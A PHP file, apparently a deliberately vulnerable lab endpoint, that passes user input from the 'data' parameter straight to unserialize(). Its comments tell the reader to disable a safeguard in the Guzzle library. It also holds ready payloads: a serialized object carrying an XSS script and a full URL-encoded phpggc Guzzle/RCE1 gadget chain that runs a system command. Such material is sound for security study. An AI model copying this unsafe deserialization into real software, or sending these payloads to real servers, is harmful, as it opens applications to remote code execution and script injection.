<?php
// apt update && apt install -y git vim
// php composer.phar require guzzlehttp/guzzle:6.3.2
// Comment __wakeup in /sources/vendor/guzzlehttp/psr7/src/FnStream.php

require 'vendor/autoload.php';

class LogLine
{
    public $content;

    public function acknowledge()
    {
        echo "Received: $this->content";
        http_response_code(200);
        die();
    }
}


if (!isset($_REQUEST["data"])) {
    http_response_code(403);
    die("Forbidden");
}

$logline = unserialize($_REQUEST["data"]);
$logline->acknowledge();

// Used to generate payload only
/*
// FOR XSS
$payload = new LogLine();
$payload->content = "<img src=a onerror=alert(document.domain)>";
echo serialize($payload);
die();

// FOR RCE
phpggc --url --fast-destruct Guzzle/RCE1 system id
a%3A2%3A%7Bi%3A7%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A2%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CPsr7%5CFnStream%00methods%22%3Ba%3A1%3A%7Bs%3A5%3A%22close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A23%3A%22GuzzleHttp%5CHandlerStack%22%3A3%3A%7Bs%3A32%3A%22%00GuzzleHttp%5CHandlerStack%00handler%22%3Bs%3A2%3A%22id%22%3Bs%3A30%3A%22%00GuzzleHttp%5CHandlerStack%00stack%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A31%3A%22%00GuzzleHttp%5CHandlerStack%00cached%22%3Bb%3A0%3B%7Di%3A1%3Bs%3A7%3A%22resolve%22%3B%7D%7Ds%3A9%3A%22_fn_close%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A5%3Bi%3A1%3Bs%3A7%3A%22resolve%22%3B%7D%7Di%3A7%3Bi%3A7%3B%7D
*/